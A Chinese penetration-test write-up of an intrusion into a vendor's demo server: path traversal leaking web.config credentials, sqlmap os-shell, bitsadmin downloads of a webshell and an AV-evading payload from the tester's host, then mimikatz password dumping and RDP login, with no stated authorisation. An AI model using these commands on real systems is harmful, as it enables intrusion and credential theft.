###  

作者：jasonxi

原文来自：[【实战】对某厂商演示站点的一次渗透测试
](https://bbs.ichunqiu.com/thread-45332-1-1.html?from=beef)

### 前言

其实这个厂商之前就挖过他们家漏洞，提交了不少漏洞给他们，如今都修复了，最近闲来无事，又对他们演示站点进行了一次“深入”研究。

### 0x01 演示站点入手

打开他们演示站点，测试了一下之前的漏洞，空账号空密码登录已经被修复了，尝试弱口令登录，123456登录进去了。

![image.png](https://image.3001.net/images/20180904/1536048444_5b8e3d3c9416d.png!small)  

然后对之前存在漏洞的上传点再次尝试截断上传，发现已经修复了。  
后台多了一些功能，比如下面这个“文档管理”，上传已经绕不过去了。

  
![image.png](https://image.3001.net/images/20180904/1536048453_5b8e3d452d4ad.png!small)  

### 0x02 前方高能预警

我们先上传了一个txt文件，里面的内容是“1”。  
文档管理这里可以删除文件夹，同时也可以预览文件夹,然后通过burp抓包看一下预览文件的数据包，数据包如下

  
![image.png](https://image.3001.net/images/20180904/1536048459_5b8e3d4b9ba0c.png!small)  

一个骚思路出现在脑子里面，我们何不尝试读取一下其他文件看看呢？

说干就干，直接输入一个不存在的文件看看，数据包fileid里面的文件名修改成Space66662333.txt

然后重放数据包，查看返回包已经提示找不到文件，并且爆出路径了。

![image.png](https://image.3001.net/images/20180904/1536048466_5b8e3d520b4f0.png!small)  

嘿嘿嘿你们知道我要干啥了吧？

看路径就知道，我们上传的1.txt是在网站的二级目录下，所以可以使用../跳转到上一级目录。../../表示往上跳两次目录。

现在我们尝试去读取网站配置文件试试，文件名修改成../../web.config然后发包。

![image.png](https://image.3001.net/images/20180904/1536048474_5b8e3d5a9c4b6.png!small)  

可以看到已经读出了网站配置文件信息，里面有数据库账号密码等等数据。

  
![image.png](https://image.3001.net/images/20180904/1536048479_5b8e3d5f39fcc.png!small)  

尝试远程连接数据库，不出意外，禁止外连啦。

### 0x03 继续分析后台

因为这套系统是真的烂，所以我猜测后台的查询功能肯定也存在注入。  
如果权限够高的话，说不定可以直接上传shell呢。

说干就干，找能查询数据的地方，我们用burp抓包，然后把抓到的数据包放进c盘下1.txt里面。  
然后启动sqlmap，输入以下命令开始检测  
`sqlmap.py -r c:\1.txt`

  
![image.png](https://image.3001.net/images/20180904/1536048485_5b8e3d65ba4f9.png!small)  

可以看到的确是存在注入的，我们输入以下命令看看是否为dba权限。  
`sqlmap.py -r c:\1.txt --is-dba`

  
![image.png](https://image.3001.net/images/20180904/1536048493_5b8e3d6d70094.png!small)![image.png](https://image.3001.net/images/20180904/1536048496_5b8e3d7099bfa.png!small)  

现在尝试输入如下命令，执行交互式shell试试。  
`sqlmap.py -r c:\1.txt --os-shell`

报错了，找不到解决方法只能重新找其他注入点试试了。

  
![image.png](https://image.3001.net/images/20180904/1536048502_5b8e3d76de150.png!small)  

咱们继续burp抓包，然后sqlmap验证。  
最后，终于有个注入点可以执行交互式shell了。  
看了下还是system权限。

  
![image.png](https://image.3001.net/images/20180904/1536048509_5b8e3d7d4edd6.png!small)  

咱们先收集一波服务器信息  
输入tasklist

  
![image.png](https://image.3001.net/images/20180904/1536048515_5b8e3d832f203.png!small)  

从上图可以看到，服务器装了eset杀软，进程是egui.exe ekrn.exe。  
说实话，我真的很讨厌这个杀软，之前就遇到个，各种工具和后门都会给你杀掉。

继续输入net user  
发现啥都没获取到，不显示账号名称。

那么咱们直接看看管理员账号是多少，还有远程登录端口是多少。  
首先输入query user得到用户名称

  
![image.png](https://image.3001.net/images/20180904/1536048522_5b8e3d8a15eb1.png!small)  

然后输入以下命令，获取到远程登录服务的pid  
`tasklist /svc |find "TermService"`  
可以看到pid出来了，pid是3312

  
![image.png](https://image.3001.net/images/20180904/1536048529_5b8e3d91be168.png!small)  

我们再输入netstat -ano |find "3312“  
图中可以看到远程端口拿到了。

  
![image.png](https://image.3001.net/images/20180904/1536048538_5b8e3d9a2eb3c.png!small)  

下面我们直接用前面的数据库密码去尝试远程登录服务器试试看。  
不过事实证明我想多了，密码错误。（多数管理员会把各种密码设置成一个）

### 0x04 尝试通过sqlmap拿shell

因为可以执行命令，但是不能添加管理账号，估计是被eset拦截了。

然后咱们尝试用echo写文件的方法写一个webshell到网站目录下。  
蛋疼的是，他的网站目录是中文的，在sqlmap下中文不知道为什么，执行的时候会自动清除中文路径。

  
![image.png](https://image.3001.net/images/20180904/1536048546_5b8e3da288d74.png!small)  

### 0x05 成功拿到webshell

他的网站目录中文路径这个的确很蛋疼，不过咱们也不能怂对吧？  
骚思路又来了......

找一个免杀的aspx一句话，然后放在自己的web服务器上。  
用bitsadmin下载这个aspx到目标上面  
`bitsadmin /transfer n http://111.111.111.111/m.aspx e:\m.aspx`

为了解决sqlmap中文路径无法交互的问题，我们再写一个bat文件，内容如下。  
`copy e:\m.aspx e:\对方网站中文路径\二级路径\网站根目录\m.aspx`

然后还是用bitsadmin下载到对方的服务上。  
`bitsadmin /transfer n http://111.111.111.111/s.bat e:\s.bat`

现在我们查看一下是否下载成功，在sqlmap里面执行dir e:\

  
![image.png](https://image.3001.net/images/20180904/1536048553_5b8e3da9283aa.png!small)  

接下来在sqlmap下面执行e:\s.bat  
会显示文件复制成功，已经把后门从e\下面拷贝到他网站根目录下了。

嘿嘿嘿，上菜刀试试，成功连接。

  
![image.png](https://image.3001.net/images/20180904/1536048557_5b8e3daddcf3d.png!small)  

然后菜刀执行net user 发现已经可以返回了，但是还是无法添加管理员账号

  
![image.png](https://image.3001.net/images/20180904/1536048563_5b8e3db3d3217.png!small)  

因为上面有eset杀软，用exp提权或者用wce、mimikatz去读取管理员密码是不可能了，各种exp上去全被干掉。

### 0x06 尝试提权

最后我的思路是这样，搞一个免杀后门，然后用bitsadmin下载免杀文件到对方的磁盘根目录下，然后sqlmap运行这个免杀文件，上线到msf后直接获取管理员密码。

说干就干，咱们先用msf生成一个shellcode然后做好免杀。  
把免杀远控放在我们开了web的服务器上  
在sqlmap下执行以下命令下载远控到目标上面。  
`bitsadmin /transfer n http://111.111.111.111/m.exe e:\m.exe`

然后msf做好监听，准备接收反弹回来的shell吧。  
监听好了以后直接在sqlmap里面执行e:\m.exe  
返回kali查看，已经成功返回session了，（之前测试过几次，都没成功上线，原来是我生成的shellcode有问题）

  
![image.png](https://image.3001.net/images/20180904/1536048573_5b8e3dbd493f4.png!small)  

在msf里面依次输入以下命令读取管理员密码  
`load mimikatz`  
`wdigest`

  
![image.png](https://image.3001.net/images/20180904/1536048577_5b8e3dc184a1f.png!small)  

拿到密码以后，配合前面收集到的远程登录端口，直接输入ip:端口号登录成功

  
![image.png](https://image.3001.net/images/20180904/1536048584_5b8e3dc86cc4b.png!small)

###  

* * *

漏洞已经上报给小厂商，虽然一点奖励都没有，但是谁叫我曾经爱（lu）过你呢？小厂商也需要一点一点成长起来对吧？

分享一波远程下载的几个方法，对付禁止上传文件的服务器我们可以尝试用这些方法下载。

查看原文可见哦~

原文地址：[【实战】对某厂商演示站点的一次渗透测试](https://bbs.ichunqiu.com/thread-45332-1-1.html?from=beef)

